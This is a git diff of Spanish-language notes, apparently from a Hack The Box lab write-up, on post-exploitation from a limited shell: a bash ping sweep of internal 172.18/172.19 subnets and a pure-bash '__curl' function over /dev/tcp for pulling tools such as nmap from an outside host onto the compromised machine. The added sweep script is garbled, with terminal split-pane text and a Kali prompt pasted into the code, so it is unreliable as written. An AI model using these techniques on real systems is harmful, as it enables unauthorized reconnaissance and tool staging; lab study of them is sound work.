@@ -31,29 +31,60 @@ Una vez dentro pues nos damos cuenta que la shell esta muy precaria ( y asi lo h
 Descubrimiento de puertos.
 
 ```
-#!/bin/bash
+#!/bin/bash                                                                                                           │    for i in $(seq 1 254); do
+                                                                                                                      │        bash -c "ping -c 1 $networks.$i" &>/dev/null && echo -e "\t[+] Host $network.$i -ACTIVE" &
+echo "Hola estoy dentro"                                                                                              │        echo "Estoy dentro del for interno Funciona..."
+                                                                                                                      │
+networks=(172.19.0 172.18.0)                                                                                          │    done; wait 
+                                                                                                                      │
+                                                                                                                      │done; tput cnorm
+                                                                                                                      │
+for  network in ${networks[@]}; do                                                                                    │
+echo "[+] Estoy escaneo  la red $network.0/24"                                                                        │
+for i in $(seq 1 254); do                                                                                             │
+                                                                                                                      │                                                                                                                     
+        timeout 1 bash -c "ping -c 1  $network.$i" &>/dev/null && echo " [+] La ip $network.$i -ACTIVE" &             │┌──(kali㉿kali)-[~/RedishHTB/content]
+                                                                                                                      │└─$ 
+done;wait                                                                                                             │
+done                                                                                                                  │
+                                                                                                                      │
+echo "Este es el final" 
+```
 
-function ctrl_c(){
-    echo -e "\n\n[!] Saliendo...\n"
-    exit 1
+## Alternativa
+
+O bien si queremos subir el nmap y no existe nada no hay nc no python no wget no curl existen funciones de wget y curl que permiten descargar incluso archivos creadas completamente con bash.
+
+> https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et
+
+```
+function __curl() {
+  read -r proto server path <<<"$(printf '%s' "${1//// }")"
+  if [ "$proto" != "http:" ]; then
+    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
+    return 1
+  fi
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [ "${HOST}" = "${PORT}" ] && PORT=80
+
+  exec 3<>"/dev/tcp/${HOST}/$PORT"
+  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
+  (while read -r line; do
+   [ "$line" = $'\r' ] && break
+  done && cat) <&3
+  exec 3>&-
 }
-
-trap ctrl_c INT
-
-
-networks=(172.18.0 172.19.0)
-
-
-tput civis; for network in ${networks[@]}
-    for i in $(seq 1 254); do
-        timeout 1 bash -c "ping -c 1 $networks.$i" &>/dev/null && echo -e "\t[+] Host $network.$i -ACTIVE" &
-    done; wait 
-
-done; tput cnorm
 ```
 
 
+Su uso 
 
+```
+__curl http://IP/archivo > archivo
+
+```
 
 
 
